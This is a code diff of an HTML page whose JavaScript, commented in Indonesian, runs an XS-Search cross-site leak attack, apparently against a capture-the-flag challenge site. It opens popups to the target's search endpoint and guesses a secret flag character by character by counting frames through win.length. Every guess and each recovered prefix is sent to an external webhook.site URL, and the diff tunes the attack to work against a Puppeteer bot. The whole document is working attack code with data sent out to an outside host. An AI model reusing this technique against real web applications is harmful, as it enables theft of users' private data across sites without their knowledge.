@@ -2,40 +2,39 @@
 <html>
 <body>
     <script>
-        const targetBase = "https://ponder.cbd2026.cloud/search?q=";
+        // Gunakan http:// untuk menghindari SSL Error Page pada Puppeteer
+        const targetBase = "http://ponder.cbd2026.cloud/search?q=";
         const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
         let flag = "flag{"; 
-        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+        const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
 
-        fetch(`${webhook}?status=skrip_dimulai_oleh_bot`);
+        fetch(`${webhook}?status=serangan_dimulai&target_mode=http`);
 
         async function tryChar(char) {
             return new Promise((resolve) => {
                 const query = flag + char;
                 const win = window.open(`${targetBase}${encodeURIComponent(query)}`);
 
-                // Jika popup diblokir, beritahu webhook
-                if (!win) {
-                    fetch(`${webhook}?error=popup_blocked_by_bot`);
-                    resolve(false);
-                    return;
-                }
-
                 setTimeout(() => {
-                    const lengthFound = win.length;
+                    if (!win) {
+                        fetch(`${webhook}?status=error_popup_blocked`);
+                        resolve(false);
+                        return;
+                    }
+
+                    const len = win.length;
                     win.close();
                     
-                    // Kirim log debug ke webhook untuk setiap karakter yang dicoba
-                    fetch(`${webhook}?char=${char}&len=${lengthFound}`);
+                    // Log setiap percobaan agar kita tahu bot tidak macet
+                    fetch(`${webhook}?char=${char}&len=${len}`);
 
-                    // KONDISI UTAMA: Sesuaikan angka ini berdasarkan hasil debug nanti
-                    // Biasanya single_match=True akan menghasilkan 1 iframe
-                    if (lengthFound === 1) {
+                    // Cek jika len > 0 (mengantisipasi jika ada lebih dari 1 frame)
+                    if (len > 0) {
                         resolve(true);
                     } else {
                         resolve(false);
                     }
-                }, 1500); // Jeda 1.5 detik agar halaman stabil
+                }, 2000); // Tunggu 2 detik agar halaman benar-benar dimuat
             });
         }
 
@@ -43,11 +42,12 @@
             for (let char of alphabet) {
                 if (await tryChar(char)) {
                     flag += char;
-                    fetch(`${webhook}?SUCCESS_FOUND=${encodeURIComponent(flag)}`);
+                    fetch(`${webhook}?PROGRESS=${encodeURIComponent(flag)}`);
                     if (char === "}") return;
-                    return start(); // Rekursi untuk karakter selanjutnya
+                    return start(); 
                 }
             }
+            fetch(`${webhook}?status=gagal_menemukan_karakter_lanjutan`);
         }
 
         window.onload = start;
